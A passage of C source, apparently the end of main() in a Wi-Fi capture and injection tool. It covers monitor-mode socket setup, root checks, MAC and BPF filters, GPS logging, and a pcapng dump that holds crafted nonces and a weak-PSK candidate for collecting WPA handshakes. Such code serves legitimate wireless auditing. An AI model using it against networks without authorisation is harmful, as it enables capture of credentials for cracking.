	while(channelscanlist3[cpa] != 0)
		{
		channelscanlist[cpa] = channelscanlist3[cpa];
		cpa++;
		}
	channelscanlist[cpa] = 0;
	}
if(globalinit() == false)
	{
	fprintf(stderr, "initialization failed\n");
	errorcount++;
	globalclose();
	}

if(weakcandidateuser != NULL)
	{
	memcpy(&weakcandidate, weakcandidateuser, weakcandidatelenuser);
	weakcandidatelen = weakcandidatelenuser;
	}

if((statusout &STATUS_CLIENT) == STATUS_CLIENT)
	{
	if(openmcclisocket(mccliport) == true) process_server();
	process_server();
	globalclose();
	}

if(interfacename == NULL)
	{
	fprintf(stderr, "no interface specified\n");
	exit(EXIT_FAILURE);
	}

if(getuid() != 0)
	{
	fprintf(stderr, "this program requires root privileges\n");
	globalclose();
	}

if(filteraplistname != NULL) filteraplistentries = readmaclist(filteraplistname, filteraplist);
if(filterclientlistname != NULL) filterclientlistentries = readmaclist(filterclientlistname, filterclientlist);
if(bpfcname != NULL) readbpfc(bpfcname);

if(checkdriverflag == true) printf("starting driver test...\n");
if(opensocket() == false)
	{
	fprintf(stderr, "warning: failed to init socket\n"
			"try to use iw to set monitor mode\n"
			"try to use ip link to bring interface up\n");
	errorcount++;
	globalclose();
	}

if((statusout &STATUS_SERVER) == STATUS_SERVER)
	{
	if(openmcsrvsocket(mcsrvport) == false)
		{
		errorcount++;
		globalclose();
		}
	}
if(showchannelsflag == true)
	{
	show_channels();
	globalclose();
	}

if(checkdriverflag == true)
	{
	cpa = 0;
	if(set_channel() == false) errorcount++;
	if(errorcount == 0) printf("driver tests passed...\nall required ioctl() system calls are supported by driver\n");
	globalclose();
	return EXIT_SUCCESS;
	}

if(extaplistname != NULL) readextbeaconlist(extaplistname);

if(pcapngoutname != NULL)
	{
	fd_pcapng = hcxcreatepcapngdump(pcapngoutname, mac_orig, interfacename, mac_myap, myrc, myanonce, mac_myclient, mysnonce, weakcandidatelen, weakcandidate);
	if(fd_pcapng <= 0)
		{
		fprintf(stderr, "could not create dumpfile %s\n", pcapngoutname);
		errorcount++;
		globalclose();
		}
	}

if(nmeaoutname != NULL)
	{
	if((gpsname == NULL) && (gpsdflag == false))
		{
		fprintf(stderr, "no GPS device selected\n");
		errorcount++;
		globalclose();
		}
	if((fh_nmea = fopen(nmeaoutname, "a")) == NULL)
		{
		perror("failed to open NMEA 0183 dump file");
		errorcount++;
		globalclose();
		}
	setbuf(fh_nmea, NULL);
	}

if((gpsname != NULL) || (gpsdflag == true)) opengps();

if(rcascanflag == true) process_fd_rca();
else if(injectionflag == true) process_fd_injection();
else process_fd();

globalclose();
return EXIT_SUCCESS;
}
/*===========================================================================*/
